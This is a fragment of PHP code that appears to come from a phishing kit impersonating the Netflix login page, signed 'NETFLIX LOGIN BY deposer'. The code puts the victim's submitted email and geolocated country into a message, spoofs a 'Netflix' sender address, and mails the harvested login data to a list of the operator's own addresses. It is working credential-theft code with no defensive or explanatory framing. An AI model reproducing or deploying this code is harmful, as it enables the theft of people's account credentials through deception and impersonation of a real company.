...
################ <font style='color: #820000;'>😈 NETFLIX LOGIN 😈</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'> <[ 😈 NETFLIX LOGIN BY deposer 😈 ]> </font> ]±±±±±±±±±±±±±±±±±±±±<br>
...
$subject=" 😈 NETFLIX LOGIN  [".$_POST['eml']."] From [".$_SESSION['ip_countryName']."] ";$headers="From: 😈 Netflix 😈 <newlogin@shadow.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/html; charset=UTF-8\r\n";if($sendtoemail=="yes"){foreach(explode(",",$yours)as $your){@mail($your,$subject,$msg,$headers);}}
